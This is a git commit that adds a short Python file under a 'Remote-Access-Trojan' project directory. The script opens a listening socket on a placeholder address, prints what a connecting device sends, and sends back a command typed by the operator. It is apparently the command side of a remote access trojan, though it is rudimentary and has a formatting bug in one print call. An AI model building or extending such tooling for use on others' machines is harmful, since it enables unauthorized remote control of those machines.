65646c9755b8739a9eef799e41acf6d387e6003d
b̴⊶d̴aar <118155606+b-daarr@users.noreply.github.com>
2024-07-24 05:04:45 +0330

    reform

---
+++ Project/Remote-Access-Trojan/Device.py
@@ -0,0 +1,16 @@
+import socket
+
+host = "[IP]"
+port = [Connection Port]
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as skt:
+    skt.bind((host, port))
+    skt.listen()
+    connection, addr = skt.accept()
+    with connection:
+        print("{addr}")
+        data = connection.recv(4068)
+        print(data)
+
+        command = input("Enter command: ")
+        connection.sendall(bytes(command, encoding="utf-8"))
